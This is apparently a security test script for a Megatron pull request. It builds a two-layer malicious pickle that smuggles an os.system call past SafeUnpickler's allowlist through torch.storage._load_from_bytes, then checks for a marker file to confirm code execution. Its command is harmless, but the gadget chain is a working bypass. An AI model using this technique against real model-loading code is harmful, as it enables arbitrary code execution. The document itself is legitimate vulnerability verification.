#!/usr/bin/env python3
"""
Proof-of-concept: Does SafeUnpickler + _load_from_bytes allow RCE?

This test exercises the EXACT code path from PR #4319:
  1. register_safe_globals() is called (as megatron does at init)
  2. A malicious pickle payload is crafted using _load_from_bytes as the outer reducer
  3. SafeUnpickler is used to load it (as _decode_extra_state would)
  4. We check whether arbitrary code executed

Run on cluster where torch is available:
  python tests/test_safe_unpickler_rce_proof.py
"""

import io
import os
import pickle
import sys
import tempfile
import traceback

# ── Megatron imports (the PR code under test) ────────────────────────
from megatron.core.safe_globals import SafeUnpickler, register_safe_globals

MARKER = os.path.join(tempfile.gettempdir(), "rce_proof_marker")

def cleanup():
    if os.path.exists(MARKER):
        os.remove(MARKER)

def build_malicious_payload() -> bytes:
    """
    Build a two-layer pickle exploit:
      Outer: pickle stream whose reducer is torch.storage._load_from_bytes(inner_bytes)
             — this is on SafeUnpickler's _SAFE_CLASSES allowlist
      Inner: a torch.save blob whose pickle contains os.system("touch <MARKER>")
             — this is processed by stdlib pickle inside _load_from_bytes
    """
    import torch
    import torch.storage

    # ── Inner payload: os.system call hidden inside a torch.save blob ──
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (f"touch {MARKER}",))

    inner_buf = io.BytesIO()
    # torch.save with weights_only is irrelevant for saving — it always uses pickle
    torch.save(MaliciousPayload(), inner_buf)
    inner_bytes = inner_buf.getvalue()

    # ── Outer payload: _load_from_bytes(inner_bytes) ──
    # We manually build the pickle rather than using __reduce__ on a class,
    # because we need the GLOBAL opcode to reference torch.storage._load_from_bytes
    # which is what SafeUnpickler.find_class will check.
    class OuterGadget:
        def __reduce__(self):
            return (torch.storage._load_from_bytes, (inner_bytes,))

    outer_bytes = pickle.dumps(OuterGadget())
    return outer_bytes


def main():
    print("=" * 70)
    print("PR #4319 SafeUnpickler RCE Proof-of-Concept")
    print("=" * 70)

    # Step 1: Activate safe globals (as megatron does at startup)
    print("\n[1] Calling register_safe_globals() ...")
    register_safe_globals()
    print("    ✓ SAFE_GLOBALS registered with torch.serialization")

    # Step 2: Build the malicious payload
    print("\n[2] Building two-layer malicious pickle payload ...")
    print("    Outer reducer: torch.storage._load_from_bytes (on SafeUnpickler allowlist)")
    print("    Inner payload: os.system('touch /tmp/rce_proof_marker')")
    payload = build_malicious_payload()
    print(f"    ✓ Payload built ({len(payload)} bytes)")

    # Step 3: Clean up any previous marker
    cleanup()
    assert not os.path.exists(MARKER), "Marker file should not exist before test"
    print(f"\n[3] Marker file cleaned: {MARKER}")

    # Step 4: Feed payload through SafeUnpickler (the PR's _decode_extra_state path)
    print("\n[4] Loading payload via SafeUnpickler (simulating _decode_extra_state) ...")
    try:
        result = SafeUnpickler(io.BytesIO(payload)).load()
        print(f"    SafeUnpickler.load() returned: {result}")
    except Exception as e:
        print(f"    SafeUnpickler.load() raised: {type(e).__name__}: {e}")
        traceback.print_exc()

    # Step 5: Check result
    print("\n" + "=" * 70)
    if os.path.exists(MARKER):
        print("🔴 RCE CONFIRMED — _load_from_bytes BYPASSES SafeUnpickler")
        print()
        print("   register_safe_globals() does NOT protect against this.")
        print("   weights_only=False inside _load_from_bytes uses stdlib pickle,")
        print("   which ignores the safe_globals allowlist entirely.")
        print()
        print("   C1 is a real, exploitable vulnerability.")
        cleanup()
        return 1
    else:
        print("🟢 RCE BLOCKED — developer is correct, safe_globals guards this path")
        return 0


if __name__ == "__main__":
    sys.exit(main())
